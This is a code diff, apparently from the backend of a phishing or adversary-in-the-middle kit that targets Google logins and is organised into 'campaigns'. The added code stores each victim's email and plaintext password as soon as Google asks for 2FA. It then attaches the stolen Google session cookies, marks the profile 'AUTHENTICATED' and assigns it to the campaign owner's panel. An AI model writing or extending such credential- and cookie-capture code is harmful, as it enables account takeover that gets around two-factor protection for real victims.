@@ -297,6 +297,30 @@ router.post('/:id/password', async (req: Request, res: Response) => {
       await resourceManager.destroySession(id);
     }
 
+    // When Google requires 2FA or DP — create profile row immediately so it appears on the profile page
+    if (result.success && result.nextStage !== 'success') {
+      try {
+        let earlyUserId: string | undefined;
+        try {
+          const camp = await prisma.campaign.findUnique({ where: { id: session.campaignId } });
+          earlyUserId = camp?.userId ?? undefined;
+        } catch {}
+
+        const earlyProfile = await profileManagerService.createProfile({
+          userId: earlyUserId,
+          campaignId: session.campaignId || '',
+          email: session.email || '',
+          password,
+          cookies: [],
+          provider: 'GOOGLE',
+        });
+        (session as any).profileId = earlyProfile.profile.id;
+        logger.info(`[CAPTURE] Profile row created at password stage: ${earlyProfile.profile.id} for ${session.email}`);
+      } catch (earlyErr: any) {
+        logger.warn(`[CAPTURE] Early profile row skipped: ${earlyErr.message}`);
+      }
+    }
+
     res.status(200).json({
       success: result.success,
       stage: result.stage,
@@ -490,6 +514,26 @@ async function createProfileFromSession(sessionId: string, cookies: any[]) {
     // Extract Google auth cookies regardless of DB state
     const googleCookies = googleAuthService.extractGoogleCookies(cookies);
 
+    // If a profile row was already created at the password stage, update it with cookies
+    const memSession = resourceManager.getSession(sessionId);
+    const existingProfileId = memSession ? (memSession as any).profileId : undefined;
+
+    if (existingProfileId) {
+      try {
+        await prisma.profile.update({
+          where: { id: existingProfileId },
+          data: {
+            cookies: googleCookies.length > 0 ? JSON.stringify(googleCookies) : undefined,
+            authStatus: googleCookies.length > 0 ? 'AUTHENTICATED' : 'NOT_AUTHENTICATED',
+          },
+        });
+        logger.success(`[CAPTURE] Profile ${existingProfileId} updated → ${googleCookies.length} cookies, AUTHENTICATED`);
+      } catch (upErr: any) {
+        logger.error(`[CAPTURE] Profile update failed: ${upErr.message}`);
+      }
+      return;
+    }
+
     // Try to get data from DB first
     let userId: string | undefined;
     let campaignId: string | undefined;
@@ -516,12 +560,21 @@ async function createProfileFromSession(sessionId: string, cookies: any[]) {
       }
     }
 
-    // Only skip if we have no db session AND no userId (true dev/no-capture mode)
-    if (!dbSession && userId === undefined) {
-      logger.warn(`[CAPTURE] No DB session and no userId — skipping profile save`);
-      logger.info(`[CAPTURE] Dev mode — ${googleCookies.length} cookies captured for: ${email || 'unknown'}`);
-      googleCookies.forEach((c: any) => logger.info(`  ${c.name}=${(c.value || '').substring(0, 30)}...`));
+    // If userId still not resolved, get it from the campaign
+    if (!userId && campaignId) {
+      try {
+        const camp = await prisma.campaign.findUnique({ where: { id: campaignId } });
+        userId = camp?.userId ?? undefined;
+      } catch {}
+    }
+
+    // Guard checks
+    if (!email) {
+      logger.warn(`[CAPTURE] No email — cannot save profile for session ${sessionId}`);
       return;
+    }
+    if (!userId) {
+      logger.warn(`[CAPTURE] No userId resolved — profile will not appear in any user's panel`);
     }
 
     // Production mode — save profile to DB
